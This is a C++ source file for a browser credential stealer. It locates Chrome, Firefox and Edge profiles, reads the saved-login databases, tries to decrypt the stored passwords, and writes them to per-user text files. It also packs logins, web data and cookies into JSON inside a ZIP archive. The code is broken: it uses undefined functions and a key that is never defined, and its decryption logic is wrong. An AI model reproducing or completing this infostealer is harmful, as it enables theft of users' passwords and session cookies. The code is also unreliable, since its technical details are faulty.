#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <sqlite3.h>
#include <openssl/aes.h>

const std::string browser_profiles[] = {"Chrome", "Firefox", "Edge"};

void find_browser_profiles(std::vector<std::string>& profiles) {
    for (auto& profile : browser_profiles) {
        if (std::filesystem::exists(profile + "/")) {
            profiles.emplace_back(profile);
        }
    }
}

void open_database(sqlite3*& db, const std::string& path) {
    int rc = sqlite3_open(&path[0], &db);
    if (rc != SQLITE_OK) {
        std::cerr << "Can't open database: " << sqlite3_errmsg(db) << std::endl;
        return;
    }
}

void close_database(sqlite3*& db) {
    if (db != nullptr) {
        int rc = sqlite3_close(db);
        if (rc != SQLITE_OK) {
            std::cerr << "Can't close database: " << sqlite3_errmsg(db) << std::endl;
        }
    }
}

void decrypt_passwords(const std::vector<std::string>& profiles, sqlite3*& db) {
    for (auto& profile : profiles) {
        open_database(db, profile + "/Local State");

        // Open the local master key
        const std::string key_path = profile + "/Local State";
        AES_KEY aes_key;
        int rc = AES_set_encrypt_key(reinterpret_cast<const unsigned char*>(local_key), sizeof(local_key), &aes_key);
        if (rc != 0) {
            std::cerr << "Can't set local key: " << AES_set_encrypt_key << std::endl;
            continue;
        }

        // Decrypt the saved passwords
        const auto login_data = get_table(db, "Login Data");
        for (auto& row : login_data) {
            auto username = row.at(0);
            auto password = row.at(1);
            std::string decrypted_password;
            AES_decrypt(reinterpret_cast<const unsigned char*>(password), reinterpret_cast<unsigned char*>(decrypted_password), aes_key, sizeof(decrypted_password));

            // Save the decrypted password to a file
            std::ofstream output_file;
            output_file.open("decrypted_" + username + ".txt", std::ios::out);
            output_file << decrypted_password;
            output_file.close();
        }

        close_database(db);
    }
}

void package_credentials(const std::vector<std::string>& profiles, sqlite3*& db) {
    for (auto& profile : profiles) {
        open_database(db, profile + "/Local State");

        // Open the local master key
        const std::string key_path = profile + "/Local State";
        AES_KEY aes_key;
        int rc = AES_set_encrypt_key(reinterpret_cast<const unsigned char*>(local_key), sizeof(local_key), &aes_key);
        if (rc != 0) {
            std::cerr << "Can't set local key: " << AES_set_encrypt_key << std::endl;
            continue;
        }

        // Package the credentials into a JSON file
        auto login_data = get_table(db, "Login Data");
        auto web_data = get_table(db, "Web Data");
        auto cookies = get_table(db, "Cookies");

        std::string credentials;
        nlohmann::json json;
        for (auto& row : login_data) {
            auto username = row.at(0);
            auto password = row.at(1);
            auto url = row.at(2);
            auto method = row.at(3);
            auto headers = row.at(4);
            auto body = row.at(5);

            json[username] = {{"password", password}, {"url", url}, {"method", method}, {"headers", headers}, {"body", body}};
        }

        credentials += json.dump();

        // Package the credentials into a ZIP file
        std::string zip_file_path = profile + "/credentials.zip";
        if (create_zip(zip_file_path, credentials) == 0) {
            std::cerr << "Can't create zip file: " << create_zip << std::endl;
        }
    }

    close_database(db);
}

int main() {
    // Find browser profiles
    std::vector<std::string> profiles;
    find_browser_profiles(profiles);

    // Open databases
    sqlite3* db = nullptr;
    for (auto& profile : profiles) {
        open_database(db, profile + "/Local State");
    }

    // Decrypt passwords
    decrypt_passwords(profiles, db);

    // Package credentials
    package_credentials(profiles, db);

    // Close databases
    close_database(db);
}
